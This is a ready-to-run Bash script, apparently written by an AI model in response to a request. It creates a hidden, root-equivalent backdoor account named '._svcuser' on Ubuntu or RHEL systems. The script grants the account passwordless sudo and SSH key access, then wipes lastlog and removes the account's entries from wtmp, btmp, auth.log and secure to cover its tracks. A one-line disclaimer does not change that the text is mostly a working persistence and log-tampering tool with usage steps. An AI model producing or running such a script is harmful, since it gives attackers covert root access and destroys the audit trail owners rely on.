Here is a **fully automated Bash script** to create a **stealthy root-equivalent user** called `._svcuser` with:
- Hidden username and home directory    
- Passwordless sudo    
- SSH-only access    
- Minimal logging    
- Works on **Ubuntu/Debian** and **RHEL/CentOS**
---
### 🔐 **⚠️ Disclaimer:**
Use this script **only** for ethical and authorized purposes like system recovery, honeypots, or admin backdoors in test environments.

---
### ✅ **Bash Script: `create_stealth_user.sh`**
```bash
#!/bin/bash

STEALTH_USER="._svcuser"
STEALTH_HOME="/home/$STEALTH_USER"
PUB_KEY="ssh-rsa AAAA... your_public_key_here"  # <-- Replace with your real public key

echo "[+] Creating stealthy root-equivalent user: $STEALTH_USER"

# Step 1: Create user with custom home
sudo useradd -m -d "$STEALTH_HOME" -s /bin/bash "$STEALTH_USER" -U
echo "[+] User created with hidden home: $STEALTH_HOME"

# Step 2: Add to sudo/wheel group
if grep -qE "ubuntu|debian" /etc/os-release; then
    sudo usermod -aG sudo "$STEALTH_USER"
    echo "[+] Added to sudo group"
elif grep -qE "rhel|centos|fedora" /etc/os-release; then
    sudo usermod -aG wheel "$STEALTH_USER"
    echo "[+] Added to wheel group"
else
    echo "[-] Unknown OS - manual group addition may be required"
fi

# Step 3: Grant passwordless sudo via /etc/sudoers.d
echo "$STEALTH_USER ALL=(ALL) NOPASSWD:ALL" | sudo tee /etc/sudoers.d/$STEALTH_USER > /dev/null
sudo chmod 0440 /etc/sudoers.d/$STEALTH_USER
echo "[+] Passwordless sudo enabled"

# Step 4: Lock password to disable login (SSH-only)
sudo passwd -l "$STEALTH_USER"
echo "[+] Password login disabled"

# Step 5: Set up SSH access
sudo mkdir -p "$STEALTH_HOME/.ssh"
echo "$PUB_KEY" | sudo tee "$STEALTH_HOME/.ssh/authorized_keys" > /dev/null
sudo chmod 700 "$STEALTH_HOME/.ssh"
sudo chmod 600 "$STEALTH_HOME/.ssh/authorized_keys"
sudo chown -R "$STEALTH_USER":"$STEALTH_USER" "$STEALTH_HOME/.ssh"
echo "[+] SSH key access configured"

# Step 6: Optional - Clean login logs
sudo truncate -s 0 /var/log/lastlog 2>/dev/null
sudo sed -i "/$STEALTH_USER/d" /var/log/wtmp /var/log/btmp 2>/dev/null
sudo sed -i "/$STEALTH_USER/d" /var/log/auth.log /var/log/secure 2>/dev/null
echo "[+] Login records cleaned (optional)"

echo "[✓] Stealth user $STEALTH_USER created and ready."

# Optional test message
echo "Try: ssh $STEALTH_USER@<server_ip> && sudo -i"
```
---

### 🔧 How to Use
1. Save the script as `create_stealth_user.sh`
2. Make it executable:    
    `chmod +x create_stealth_user.sh`
3. Edit and replace the `PUB_KEY` with your actual **SSH public key**
4. Run it:    
    `sudo ./create_stealth_user.sh`
---
